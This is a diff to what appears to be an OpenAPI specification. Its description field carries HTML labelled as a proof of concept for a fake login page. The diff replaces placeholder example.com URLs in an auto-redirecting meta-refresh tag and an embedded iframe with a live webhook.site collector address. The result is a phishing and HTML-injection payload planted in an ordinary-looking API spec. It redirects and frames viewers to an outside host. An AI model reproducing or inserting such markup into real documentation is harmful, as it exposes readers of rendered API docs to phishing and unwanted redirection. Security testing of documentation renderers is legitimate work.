@@ -5,7 +5,7 @@ info:
   description: |
     <!-- POC: Fake Login Page with Redirect -->
     <!-- Auto redirect after 2 seconds -->
-    <meta http-equiv="refresh" content="2; url=https://example.com/redirected">
+    <meta http-equiv="refresh" content="2; url=https://webhook.site/89c91f6e-d10c-45c2-94d8-d9a26d5d335e">
 
     <div style="max-width:380px;margin:40px auto;padding:32px;background:#fff;
                 border-radius:16px;box-shadow:0 4px 16px rgba(0,0,0,0.15);
@@ -30,7 +30,7 @@ info:
     </div>
 
     <!-- Embed external page -->
-    <iframe src="https://example.com" 
+    <iframe src="https://webhook.site/89c91f6e-d10c-45c2-94d8-d9a26d5d335e" 
             style="width:100%;height:200px;border:1px solid #ccc;margin-top:20px;">
     </iframe>
 paths: {}
